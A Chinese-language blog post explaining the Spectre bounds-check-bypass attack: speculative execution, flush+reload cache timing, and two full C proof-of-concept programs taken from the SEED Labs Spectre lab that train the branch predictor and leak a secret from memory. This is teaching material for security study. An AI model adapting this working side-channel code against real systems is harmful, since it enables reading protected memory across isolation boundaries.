---
title: Spectre Attack
date: 2019.10.5
catalog: true
subtitle: 
header-img: 
top: false
tags: 
categories: Security 
---
## Spectre攻击概述
Spectre攻击是一种利用cpu在执行代码时的漏洞，诱使victim程序执行其本不该执行的代码导致数据的泄漏，在2017年被发现直到2018年才会公开，影响了大量的使用Intel，ARM，AMD芯片的设备。
## 攻击涉及主要技术
### CPU预测执行
由于现在CPU的频率提高越来越困难（频率越高，导致温度变高，容易烧坏芯片），CPU普遍采用两中技术来提高cpu执行代码的速度，一种是乱序执行，通过将相互独立的指令并行执行来提高执行的速度（被用在meltdown攻击中）。另一种就是预测执行，它的应用场景是cpu在应用乱序执行机制执行代码时，当遇到一些跳转时（比如条件跳转，间接跳转），如果跳转的产生需要依赖与一些未完成的指令，导致不能马上执行跳转，此时，cpu便会执行预测执行，预测跳转的目的地并继续往下执行。
### 基于缓存的侧信道攻击
flush+reload方法是Yuval Yarom和Katrina Falkner两位大牛在2014年的usenix上提出。程序在访问某一地址内存时，如果该内存之前被访问过，则会放在缓存中，则此次访问会产生一个缓存命中，导致访问速度比一般访问内存快很多。这很大程度提高了计算机访问内存的速度，但也给攻击者带来了可趁之机。攻击者可以扫描内存，对每一次的访问内存进行计时，根据缓存命中与否的访问时间上的差异，可以确定该内存是否被访问过。这个方法针对不同的场景有不同的用法。那两位作者在他们的论文中用这个方法获得了rsa算法的密钥。Spectre用这个方法读取了相关内存的值，具体的会在下面介绍。
## Spectre攻击流程
Spectre攻击在论文中实施了两种攻击，一种是针对条件跳转的，一种是针对间接跳转的。由于间接跳转的比较复杂，本文就对条件跳转的攻击进行讨论。
我们先来看一下代码
```
if(x<array1_size){
    y=array2[array1[x]*4096];
}
 
```
按照程序的正常运行，只有当x满足条件x< array1_size，时，程序才会执行下面的语句，但是当攻击者可以控制预测执行时，攻击者就可以在x> array1_size的情况下使程序执行下面的语句。大家有兴趣的可以用一下代码尝试，该代码取自seedlab中的spectreattack实验。
```
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

int size = 10;
uint8_t array[256*4096];
uint8_t temp = 0;
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

void reloadSideChannel()
{
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
    addr = &array[i*4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD){
	printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
        printf("The Secret = %d.\n",i);
    }
  } 
}

void victim(size_t x)
{
  if (x < size) {  
  temp = array[x * 4096 + DELTA];  
  }
}

int main() {
  int i;
  // FLUSH the probing array
  flushSideChannel();
  // Train the CPU to take the true branch inside victim()
  for (i = 0; i < 10; i++) {   
   _mm_clflush(&size); 
   victim(i);
  }
  // Exploit the out-of-order execution
  _mm_clflush(&size);
  for (i = 0; i < 256; i++)
   _mm_clflush(&array[i*4096 + DELTA]); 
  victim(97);  
  // RELOAD the probing array
  reloadSideChannel();
  return (0); 
}
```
在上面的victim程序中，x假设是一个我们想要访问的值，之所以要乘4096是为了相邻两个x值之间的距离，防止prefetch机制。DELTA是为了防止一个在i=0时，程序在访问本地变量的时候，cache会一个line大小的数据（包括array[0]）全放入缓存，导致flush过程的失败。

控制预测执行成功后，我们模拟一个应用场景，比如说在浏览器浏览网页时，不同网页是在一个进程中的，而进程内的隔离一般是通过sandbox技术实现，在sandbox中，常见的隔离手段是通过边界检查，例如下面的代码：
```
if (address_want_to_access<permitted_address_size){
  return memory[address_want_to_access]
}
```
试想，如果我们能够绕过边界检查，把我们要读取的内存作为内存地址放在缓存中，然后再用flush+reload技术获得缓存中存储的内存地址，这样一顿操作后，我们是不是就能读取想要的数据了？
我们来看如下代码片段，我们假设我们已经训练好预测执行，victim函数是一个边界检查函数，x是我们想要读取的内存地址，我们调用victim函数并将结果放到数组中进行运算，这是为了将数据能够泄漏到缓存中，使得我们能用flush+reload技术去读取想要读取的数据。
```
uint8_t victim(x){

  if(x<buffer_size){
    return buffer[x]
  }else{
    return 0
  }
}

int main(){
  x=address_want_to_read;
  s=victim(x);               //读取指定数据
  array[s*4096+DELTA]+=99;//为了访问内存，将数据泄漏到缓存中
}
```
最后附上一个seedlab上spectreattack的一个程序代码
```
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
uint8_t temp = 0;
char *secret = "Some Secret Value";   
uint8_t array[256*4096];

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x < buffer_size) {
     return buffer[x];
  } else {
     return 0;
  } 
}

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

void reloadSideChannel()
{
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
    addr = &array[i*4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD){
	printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
        printf("The Secret = %d.\n",i);
    }
  } 
}
void spectreAttack(size_t larger_x)
{
  int i;
  uint8_t s;
  volatile int z;
  // Train the CPU to take the true branch inside restrictedAccess().
  for (i = 0; i < 10; i++) { 
   _mm_clflush(&buffer_size);
   restrictedAccess(i); 
  }
  // Flush buffer_size and array[] from the cache.
  _mm_clflush(&buffer_size);
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  for (z = 0; z < 100; z++) { }
  // Ask restrictedAccess() to return the secret in out-of-order execution. 
  s = restrictedAccess(larger_x);  
  array[s*4096 + DELTA] += 88;  
}

int main() {
  flushSideChannel();
  size_t larger_x = (size_t)(secret - (char*)buffer);  
  spectreAttack(larger_x);
  reloadSideChannel();
  return (0);
}
```
[关于seedlab的spectre attack详细介绍请看](https://seedsecuritylabs.org/Labs_16.04/PDF/Spectre_Attack.pdf)

以上就是spectre的基本思想，论述的不清楚的地方请大家多多见谅,欢迎大家与我一起交流学习